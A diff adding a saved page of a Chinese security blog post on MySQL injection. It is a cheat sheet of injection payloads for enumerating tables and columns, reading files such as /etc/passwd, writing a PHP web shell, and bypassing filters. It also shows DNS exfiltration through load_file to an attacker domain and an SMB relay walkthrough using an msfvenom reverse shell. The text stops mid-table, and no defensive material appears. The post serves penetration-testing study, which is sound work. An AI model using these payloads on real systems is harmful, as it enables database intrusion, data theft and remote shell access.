@@ -1,0 +1,1141 @@
+<!DOCTYPE html>
+<!--[if IE 7]>
+<html class="ie ie7" lang="zh-CN">
+<![endif]-->
+<!--[if IE 8]>
+<html class="ie ie8" lang="zh-CN">
+<![endif]-->
+<!--[if !(IE 7) & !(IE 8)]><!-->
+<html lang="zh-CN"><!--<![endif]--><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>MySQL注入攻击与防御 | Syclover Team</title>
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="http://blog.sycsec.com/xmlrpc.php">
+<!--[if lt IE 9]>
+<script src="http://blog.sycsec.com/wp-content/themes/twentytwelve/js/html5.js" type="text/javascript"></script>
+<![endif]-->
+<link rel="dns-prefetch" href="http://fonts.googleapis.com/">
+<link rel="dns-prefetch" href="http://s.w.org/">
+<link href="https://fonts.gstatic.com/" crossorigin="" rel="preconnect">
+<link rel="alternate" type="application/rss+xml" title="Syclover Team » Feed" href="http://blog.sycsec.com/?feed=rss2">
+<link rel="alternate" type="application/rss+xml" title="Syclover Team » 评论Feed" href="http://blog.sycsec.com/?feed=comments-rss2">
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/blog.sycsec.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.3"}};
+			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel="stylesheet" id="twentytwelve-fonts-css" href="MySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20|%20Syclover%20Team_files/css.css" type="text/css" media="all">
+<link rel="stylesheet" id="twentytwelve-style-css" href="MySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20|%20Syclover%20Team_files/style.css" type="text/css" media="all">
+<!--[if lt IE 9]>
+<link rel='stylesheet' id='twentytwelve-ie-css'  href='http://blog.sycsec.com/wp-content/themes/twentytwelve/css/ie.css?ver=20121010' type='text/css' media='all' />
+<![endif]-->
+<script type="text/javascript" src="MySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20|%20Syclover%20Team_files/jquery.js"></script>
+<script type="text/javascript" src="MySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20|%20Syclover%20Team_files/jquery-migrate.js"></script>
+<link rel="https://api.w.org/" href="http://blog.sycsec.com/?rest_route=/">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.sycsec.com/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.sycsec.com/wp-includes/wlwmanifest.xml"> 
+<link rel="prev" title="NJCTF2017-writeup" href="http://blog.sycsec.com/?p=978">
+<link rel="next" title="胖哈勃杯第十三届CUIT校赛官方Writeup" href="http://blog.sycsec.com/?p=1095">
+<meta name="generator" content="WordPress 4.7.3">
+<link rel="canonical" href="http://blog.sycsec.com/?p=1005">
+<link rel="shortlink" href="http://blog.sycsec.com/?p=1005">
+<link rel="alternate" type="application/json+oembed" href="http://blog.sycsec.com/?rest_route=%2Foembed%2F1.0%2Fembed&amp;url=http%3A%2F%2Fblog.sycsec.com%2F%3Fp%3D1005">
+<link rel="alternate" type="text/xml+oembed" href="http://blog.sycsec.com/?rest_route=%2Foembed%2F1.0%2Fembed&amp;url=http%3A%2F%2Fblog.sycsec.com%2F%3Fp%3D1005&amp;format=xml">
+    <script type="text/javascript" src="MySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20|%20Syclover%20Team_files/highlight.js"></script>
+    <script type="text/javascript">hljs.initHighlightingOnLoad();</script>
+    <link rel="stylesheet" href="MySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20|%20Syclover%20Team_files/monokai_sublime.css">
+    <style>.entry-content pre, .comment-content pre {padding: 0px;}
+.entry-content pre code, .comment-content pre code {display: inherit; line-height: 1.4; overflow: auto;}
+</style>
+		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+		<script src="MySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20|%20Syclover%20Team_files/wb.js" type="text/javascript" charset="utf-8"></script>
+</head>
+
+<body class="post-template-default single single-post postid-1005 single-format-standard custom-font-enabled">
+<div id="page" class="hfeed site">
+	<header id="masthead" class="site-header" role="banner">
+		<hgroup>
+			<h1 class="site-title"><a href="http://blog.sycsec.com/" title="Syclover Team" rel="home">Syclover Team</a></h1>
+			<wb:follow-button uid="3424789300" type="red_2" width="136" height="24"></wb:follow-button>
+			<h2 class="site-description">三叶草安全小组，专注网络安全</h2>
+		</hgroup>
+
+		<nav id="site-navigation" class="main-navigation" role="navigation">
+			<button class="menu-toggle">Menu</button>
+			<a class="assistive-text" href="#content" title="Skip to content">Skip to content</a>
+			<div class="menu-syclover-container"><ul id="menu-syclover" class="nav-menu"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="http://blog.sycsec.com/">首页</a></li>
+<li id="menu-item-21" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-21"><a href="#">技术专栏</a>
+<ul class="sub-menu">
+	<li id="menu-item-14" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-14"><a href="http://blog.sycsec.com/?cat=4">逆向工程</a></li>
+	<li id="menu-item-12" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-12"><a href="http://blog.sycsec.com/?cat=3">渗透测试</a></li>
+	<li id="menu-item-13" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13"><a href="http://blog.sycsec.com/?cat=6">编程开发</a></li>
+	<li id="menu-item-20" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-20"><a href="http://blog.sycsec.com/?cat=9">Linux</a></li>
+</ul>
+</li>
+<li id="menu-item-11" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-11"><a href="http://blog.sycsec.com/?cat=5">情感专栏</a></li>
+<li id="menu-item-10" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-10"><a href="http://blog.sycsec.com/?cat=7">WarGame</a></li>
+<li id="menu-item-24" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24"><a href="http://blog.sycsec.com/?page_id=22">开源项目</a></li>
+<li id="menu-item-18" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-18"><a href="http://blog.sycsec.com/?page_id=16">关于我们</a></li>
+</ul></div>		</nav><!-- #site-navigation -->
+
+			</header><!-- #masthead -->
+
+	<div id="main" class="wrapper">
+	<div id="primary" class="site-content">
+		<div id="content" role="main">
+
+			
+				
+	<article id="post-1005" class="post-1005 post type-post status-publish format-standard hentry category-pentest">
+				<header class="entry-header">
+			
+						<h1 class="entry-title">MySQL注入攻击与防御</h1>
+								</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Author:rootclay</p>
+<p>本文主要是做一个Mysql的注入总结，对于Mysql来说利用的方式太过于灵活，这里总结了一些主流的一些姿势，如果有好的姿势可以多加交流，文章如果有错也欢迎各位dalao指出:)</p>
+<p>[TOC]</p>
+<h2>注入常用函数与字符</h2>
+<p>下面几点是注入中经常会用到的语句</p>
+<ul>
+<li>控制语句操作(select, case, if(), …)</li>
+<li>比较操作(=, like, mod(), …)</li>
+<li>字符串的猜解操作(mid(), left(), rpad(), …)</li>
+<li>字符串生成操作(0x61, hex(), conv()(使用conv([10-36],10,36)可以实现所有字符的表示))</li>
+</ul>
+<h2>测试注入</h2>
+<p>可以用以下语句对一个可能的注入点进行测试</p>
+<table>
+<thead>
+<tr>
+<th>string</th>
+<th>numeric</th>
+<th>login</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>'</td>
+<td>AND 1</td>
+<td>' OR '1</td>
+</tr>
+<tr>
+<td>' '</td>
+<td>AND 0</td>
+<td>' OR 1 — –</td>
+</tr>
+<tr>
+<td>"</td>
+<td>AND true</td>
+<td>" OR "" = "</td>
+</tr>
+<tr>
+<td>""</td>
+<td>AND false</td>
+<td>" OR 1 = 1 — –</td>
+</tr>
+<tr>
+<td>\</td>
+<td>1<em>2</em></td>
+<td>'='</td>
+</tr>
+<tr>
+<td>\</td>
+<td>12</td>
+<td>'LIKE'</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>'=0–+</td>
+</tr>
+<tr>
+<td>SELECT <em> FROM Users WHERE id = '1''';&lt;br&gt;SELECT 1 FROM Users WHERE 1 = '1'''''''''''''UNION SELECT '2';</em></td>
+<td>SELECT  FROM Users WHERE id = 3-2;</td>
+<td>SELECT * FROM Users WHERE username = 'admin' AND password = '' OR '' = '';</td>
+</tr>
+</tbody>
+</table>
+<h2>注释符</h2>
+<p>以下是Mysql中可以用到的注释符：</p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>#</td>
+<td>Hash注释</td>
+</tr>
+<tr>
+<td>/*</td>
+<td>C语言风格注释</td>
+</tr>
+<tr>
+<td>—</td>
+<td>SQL语句注释</td>
+</tr>
+<tr>
+<td>;%00</td>
+<td>空字节</td>
+</tr>
+<tr>
+<td>`</td>
+<td>反引号(只能在语句尾使用)</td>
+</tr>
+</tbody>
+</table>
+<p>Examples:</p>
+<pre><code class="sql">SELECT * FROM Users WHERE username = &amp;#39;&amp;#39; OR 1=1 -- -&amp;#39; AND password = &amp;#39;&amp;#39;;
+SELECT * FROM Users WHERE id = &amp;#39;&amp;#39; UNION SELECT 1, 2, 3`&amp;#39;;
+</code></pre>
+<h2>版本&amp;主机名&amp;用户&amp;库名</h2>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>主机名</th>
+<th>用户</th>
+<th>库名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>VERSION()</td>
+<td>@@HOSTNAME</td>
+<td>user()</td>
+<td>database()</td>
+</tr>
+<tr>
+<td>@@VERSION</td>
+<td></td>
+<td>current<em>user()</em></td>
+<td>SELECT schemaname FROM information<em>schema.schemata;</em></td>
+</tr>
+<tr>
+<td>@@GLOBAL.VERSION</td>
+<td></td>
+<td>systemuser()</td>
+<td>SELECT DISTINCT(db) FROM mysql.db;–</td>
+</tr>
+<tr>
+<td>/<em>!mysql版本号</em>/（/<em>!50094eaea</em>/）当数字小于版本号时返回TRUE</td>
+<td></td>
+<td>session<em>user()</em></td>
+<td></td>
+</tr>
+<tr>
+<td>SELECT * FROM Users WHERE id = ‘1’ AND MID(VERSION(),1,1) = ‘5’;</td>
+<td></td>
+<td>SELECT CONCATWS(0x3A, user, password) FROM mysql.user WHERE user = ‘root’–</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2>表和字段</h2>
+<h3>确定字段数</h3>
+<h4>ORDER BY</h4>
+<p>ORDER BY用于判断表中的字段个数</p>
+<table>
+<thead>
+<tr>
+<th>column</th>
+<th>column</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1′ ORDER BY 1–+</td>
+<td>True</td>
+</tr>
+<tr>
+<td>1′ ORDER BY 2–+</td>
+<td>True</td>
+</tr>
+<tr>
+<td>1′ ORDER BY 3–+</td>
+<td>True</td>
+</tr>
+<tr>
+<td>1′ ORDER BY 4–+</td>
+<td>False – 字段有三个</td>
+</tr>
+<tr>
+<td>-1′ UNION SELECT 1,2,3–+</td>
+<td>True</td>
+</tr>
+</tbody>
+</table>
+<h4>SELECT … INTO</h4>
+<p>关于SELECT … INTO 的解释可以看这一篇文章<a href="http://www.w3school.com.cn/sql/sql_select_into.asp">SELECT … INTO解释</a></p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>返回</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-1 UNION SELECT 1 INTO @,@,@</td>
+<td>The used SELECT statements have a different number of columns</td>
+</tr>
+<tr>
+<td>-1 UNION SELECT 1 INTO @,@</td>
+<td>The used SELECT statements have a different number of columns</td>
+</tr>
+<tr>
+<td>-1 UNION SELECT 1 INTO @</td>
+<td>没有报错就说明只有一列</td>
+</tr>
+</tbody>
+</table>
+<p>当出现LIMIT时可以用以下语句：</p>
+<pre><code class="sql">SELECT username FROM Users limit 1,{INJECTION POINT};
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>释意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1 INTO @,@,@</td>
+<td>The used SELECT statements have a different number of columns</td>
+</tr>
+<tr>
+<td>1 INTO @,@</td>
+<td>没有报错就说明只有两列</td>
+</tr>
+</tbody>
+</table>
+<h4>判断已知表名的字段数</h4>
+<pre><code class="sql">AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
+</code></pre>
+<pre><code class="sql">SELECT passwd FROM Users WHERE id = {INJECTION POINT};
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>释意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1 AND (SELECT * FROM Users) = 1</td>
+<td>Operand should contain 3 column(s)说明只有3列</td>
+</tr>
+</tbody>
+</table>
+<h3>查表名</h3>
+<p>以下提过几种方式对库中表进行查询</p>
+<table>
+<thead>
+<tr>
+<th>UNION查询</th>
+<th>BLIND盲注</th>
+<th>ERROR报错</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>UNION SELECT GROUP<em>CONCAT(table</em>name) FROM information<em>schema.tables</em></td>
+<td>AND SELECT SUBSTR(tablename,1,1) FROM information<em>schema.tables &gt; 'A'</em></td>
+<td>1+and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,table</em>name,0x7e) FROM information<em>schema.tables where table</em>schema=database() LIMIT 0,1)) from information<em>schema.tables limit 0,1),floor(rand(0)</em>2))x from informationschema.tables group by x)a)</td>
+</tr>
+</tbody>
+</table>
+<h3>查列名</h3>
+<p>以下提过几种方式对表中列进行查询</p>
+<table>
+<thead>
+<tr>
+<th>UNION查询</th>
+<th>BLIND盲注</th>
+<th>ERROR报错</th>
+<th>PROCEDURE ANALYSE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>UNION SELECT GROUP<em>CONCAT(column</em>name) FROM information<em>schema.columns WHERE table</em>name = 'tablename' 可以不使用单引号，用16进制</td>
+<td>AND SELECT SUBSTR(column<em>name,1,1) FROM information</em>schema.columns &gt; 'A'</td>
+<td>1+and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,column<em>name,0x7e) FROM information</em>schema.columns where table<em>name=0x61646D696E LIMIT 0,1)) from information</em>schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)</td>
+<td>1 LIMIT 1,1 PROCEDURE ANALYSE()  获取到第二个字段名</td>
+</tr>
+</tbody>
+</table>
+<h2>字符串连接</h2>
+<p>下面的几条语句都可以用以连接字符</p>
+<table>
+<thead>
+<tr>
+<th>字符串连接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SELECT 'a' 'd' 'mi' 'n';</td>
+</tr>
+<tr>
+<td>SELECT CONCAT('a', 'd', 'm', 'i', 'n');</td>
+</tr>
+<tr>
+<td>SELECT CONCAT<em>WS('', 'a', 'd', 'm', 'i', 'n');</em></td>
+</tr>
+<tr>
+<td>SELECT GROUPCONCAT('a', 'd', 'm', 'i', 'n');</td>
+</tr>
+</tbody>
+</table>
+<h2>条件语句&amp;时间函数</h2>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>释意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CASE</td>
+<td>SLEEP()   mysql5以上才引入</td>
+</tr>
+<tr>
+<td>IF()</td>
+<td>BENCHMARK()  mysql4/5都有</td>
+</tr>
+<tr>
+<td>IFNULL()</td>
+<td>' – (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) – '</td>
+</tr>
+<tr>
+<td>NULLIF()</td>
+<td>SELECT IF(1=1, sleep(5), false);</td>
+</tr>
+<tr>
+<td>SELECT IF(1=1, true, false);</td>
+<td></td>
+</tr>
+<tr>
+<td>SELECT CASE WHEN 1=1 THEN true ELSE false END;</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>其中BENCHMARK函数是指执行某函数的次数，次数多时能够达到与sleep函数相同的效果</p>
+<h2>文件操作</h2>
+<h3>文件操作权限</h3>
+<p>在MySQL中，存在一个称为secure<em>file</em>priv的全局系统变量。 该变量用于限制数据的导入和导出操作，例如SELECT … INTO OUTFILE语句和LOAD_FILE（）</p>
+<ol>
+<li>如果secure<em>file</em>priv变量为空那么直接可以使用函数,如果为null是不能使用</li>
+<li>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</li>
+</ol>
+<p><img alt="mysql——file" src="MySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20|%20Syclover%20Team_files/803a3db38c8007a3.png"></p>
+<p>也可使用如下语句查询</p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>是否需需要root</th>
+<th>版本支持</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SELECT file<em>priv FROM mysql.user WHERE user = 'username';</em></td>
+<td>需要root</td>
+<td>mysql4/5</td>
+</tr>
+<tr>
+<td>SELECT grantee, isgrantable FROM information<em>schema.user</em>privileges WHERE privilege_type = 'file' AND grantee like '%username%';</td>
+<td>不需要root</td>
+<td>mysql5</td>
+</tr>
+</tbody>
+</table>
+<h3>读文件</h3>
+<p>读文件函数<code>LOAD_FILE()</code></p>
+<p>Examples:</p>
+<pre><code class="sql">SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE(0x2F6574632F706173737764);
+</code></pre>
+<p>注意点：<br>
+1. LOAD_FILE的默认目录@@datadir<br>
+2. 文件必须是当前用户可读<br>
+3. 读文件最大的为1047552个byte, <code>@@max_allowed_packet</code>可以查看文件读取最大值</p>
+<h3>写文件</h3>
+<p><code>INTO OUTFILE/DUMPFILE</code></p>
+<p>经典写文件例子：</p>
+<pre><code class="sql">To write a PHP shell:
+SELECT '&lt;? system($_GET[\'c\']); ?&gt;' INTO OUTFILE '/var/www/shell.php';
+</code></pre>
+<p><strong><br>
+这两个函数都可以写文件，但是有很大的差别<br>
+INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符<br>
+INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择<br>
+当我们在UDF提权的场景是需要上传二进制文件等等用OUTFILE函数是不能成功的<br>
+</strong><br>
+网上有很多文章介绍，比如<a href="http://www.cnblogs.com/milantgh/p/5444398.html">这篇</a></p>
+<p>注意点：<br>
+1. INTO OUTFILE不会覆盖文件<br>
+2. INTO OUTFILE必须是查询语句的最后一句<br>
+3. 路径名是不能编码的，必须使用单引号</p>
+<h2>带外通道</h2>
+<p>关于带外通道的注入前段时间国外的大佬已经总结过了，我基本复现了一下，博客有<a href="http://www.rootclay.club/?p=213">文章</a>，这里简单提一下</p>
+<h3>什么是带外通道注入？</h3>
+<p>   带外通道攻击主要是利用其他协议或者渠道从服务器提取数据. 它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.</p>
+<h3>条件限制</h3>
+<ul>
+<li>首先不用多说,这些函数是需要绝对路径的</li>
+<li>如果secure<em>file</em>priv变量为空那么直接可以使用函数,如果为null是不能使用</li>
+<li>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</li>
+</ul>
+<h3>DNS注入</h3>
+<pre><code class="sql">select load_file(concat('\\\\',version(),'.rootclay.club\\clay.txt'));
+select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
+</code></pre>
+<p>上面的语句执行的结果我们可以通过wireshark抓包看一下，过滤一下DNS协议即可清晰看到数据出去的样子，如下图<br>
+<img alt="" src="MySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20|%20Syclover%20Team_files/26fbe5de9ea3cfe8.png"></p>
+<p>进行DNS注入需要域名解析，自己有的话最好，但是没有的朋友也没事，这里推荐一个网站<a href="http://ceye.io/record/index">CEYE</a>可以查看数据</p>
+<h3>SMB Relay 注入攻击</h3>
+<h4>What is SMB relay</h4>
+<p>这里简单的描述一下SMB relay这个过程</p>
+<p><strong>假设有主机B与A</strong><br>
+(1) A向B发起连接请求<br>
+(2) B向A发送挑战(一组随机数据，8字节)<br>
+(3) A用源自明文口令的DESKEY对挑战进行标准DES加密得到响应，并发往B<br>
+(4) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对前面发往A的挑战进<br>
+    行标准DES加密<br>
+(5) 如果(4)中计算结果与A送过来的响应匹配，A被允许访问B<br>
+<strong>现在假设一个攻击者C卷入其中</strong><br>
+(1) C向B发起连接请求<br>
+(2) B向C发送挑战D(一组随机数据)<br>
+(3) C等待A向B发起连接请求<br>
+(4) 当A向B发起连接请求时，C伪造成B向A发送挑战D<br>
+(5) A用源自明文口令的DESKEY对挑战D进行标准DES加密得到响应E，并发往B<br>
+(6) C截获到响应E，将它做为针对(2)中挑战D的响应发往B，并声称自己是A<br>
+(7) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对挑战D进行标准DES<br>
+    加密<br>
+(8) 如果(7)中计算结果与C送过来的响应匹配，C被允许以A的身份访问B。</p>
+<h4>攻击流程</h4>
+<p><img alt="" src="MySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20|%20Syclover%20Team_files/373a817ae5fc4ea4.png"></p>
+<p>关于SMB relay攻击窃取NTML与shell请看这篇文章<a href="http://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python">SMB Relay Demystified and NTLMv2 Pwnage with Python</a></p>
+<p>整理了一下实际操作的步骤如下:<br>
+1. 首先生成一个反向shell:<br>
+msfvenom -p windows/meterpreter/reverse<em>tcp LHOST=攻击机ip LPORT=攻击机监听端口  -f exe &gt; reverse</em>shell.exe<br>
+2. 运行<a href="https://github.com/CoreSecurity/impacket">smbrelayx</a>，指定被攻击者和生成的反向shell，等待连接。<br>
+smbrelayx.py -h 被攻击者ip -e 反向shell文件位置<br>
+3. 使用模块multi/handler。侦听攻击机ip,攻击机监听端口<br>
+4. 在MySQL Server上运行如下的代码，则会产生shell。相当于访问攻击机的smb服务,但实际上是窃取了mysql<em>server的身份<br>
+select load</em>file('\\攻击机ip\aa');</p>
+<h2>绕过技巧</h2>
+<h3>绕过单引号</h3>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SELECT <em> FROM Users WHERE username = 0x61646D696E</em></td>
+<td>HEX编码</td>
+</tr>
+<tr>
+<td>SELECT  FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</td>
+<td>CHAR()函数</td>
+</tr>
+</tbody>
+</table>
+<h3>大小写绕过</h3>
+<pre><code class="sql">?id=1+UnIoN+SeLecT+1,2,3--
+</code></pre>
+<h3>替换绕过</h3>
+<pre><code class="sql">?id=1+UNunionION+SEselectLECT+1,2,3--
+</code></pre>
+<h3>注释绕过</h3>
+<pre><code class="sql">?id=1+un/**/ion+se/**/lect+1,2,3--
+</code></pre>
+<h3>特殊嵌入绕过</h3>
+<pre><code class="sql">?id=1/*!UnIoN*/SeLecT+1,2,3--
+</code></pre>
+<h3>宽字节注入</h3>
+<pre><code class="bash">SQL注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。
+</code></pre>
+<h3>MySQL版本号字符</h3>
+<pre><code class="sql">Examples:
+UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+
+SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);
+</code></pre>
+<ul>
+<li>这样的查询语句是可以执行的，我理解为类似Python中第一行注释指定解析器一样<code>#!/bin/sh</code></li>
+<li>对于小于或等于版本号的语句就会执行</li>
+<li>例如目前的Mysql版本为5.7.17那么/<em>!50717</em>/及其以下的语句即可执行</li>
+</ul>
+<h3>字符编码绕过</h3>
+<p>前端时间看到ph师傅的博客是讨论mysql字符编码的文章，大概意思如下，原文在<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">这里</a><br>
+当出现有以下代码时，指设置了字符编码为utf-8，但并不是全部为utf-8，而在具体的转换过程中会出现意外的情况，具体可以看ph师傅的文章</p>
+<pre><code class="php">$mysqli-&gt;query("set names utf8");
+</code></pre>
+<p>在sql查询中</p>
+<pre><code class="sql">test.php?username=admin%e4中的%e4会被admin忽略掉而绕过了一些逻辑，还有一些类似于$e4这样的字符如%c2等
+</code></pre>
+<h3>绕空格</h3>
+<h4>特殊字符绕过空格</h4>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>09</td>
+<td>Horizontal Tab</td>
+</tr>
+<tr>
+<td>0A</td>
+<td>New Line</td>
+</tr>
+<tr>
+<td>0B</td>
+<td>Vertical Tab</td>
+</tr>
+<tr>
+<td>0C</td>
+<td>New Page</td>
+</tr>
+<tr>
+<td>0D</td>
+<td>Carriage Return</td>
+</tr>
+<tr>
+<td>A0</td>
+<td>Non-breaking Space</td>
+</tr>
+<tr>
+<td>20</td>
+<td>Space</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="sql">Example:&lt;/p&gt;
+
+&lt;p&gt;'%0AUNION%0CSELECT%A0NULL%20%23
+</code></pre>
+<h4>括号绕过空格</h4>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>28</td>
+<td>(</td>
+</tr>
+<tr>
+<td>29</td>
+<td>)</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="sql">Example:&lt;/p&gt;
+
+&lt;p&gt;UNION(SELECT(column)FROM(table))
+</code></pre>
+<h4>and/or后插入字符绕过空格</h4>
+<p>任意混合<code>+ - ~ !</code>可以达到绕过空格的效果（可以现在本地测试，混合后需要的奇偶数可能不同）</p>
+<pre><code class="sql">SELECT DISTINCT(db) FROM mysql.db WHERE `Host`=&amp;#39;localhost&amp;#39; and-++-1=1;需要偶数个--
+
+SELECT DISTINCT(db) FROM mysql.db WHERE `Host`=&amp;#39;localhost&amp;#39; and!!~~~~!1=1;需要奇数个！
+</code></pre>
+<p>其实一下的字符都可以测试</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>释意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>20</td>
+<td>Space</td>
+</tr>
+<tr>
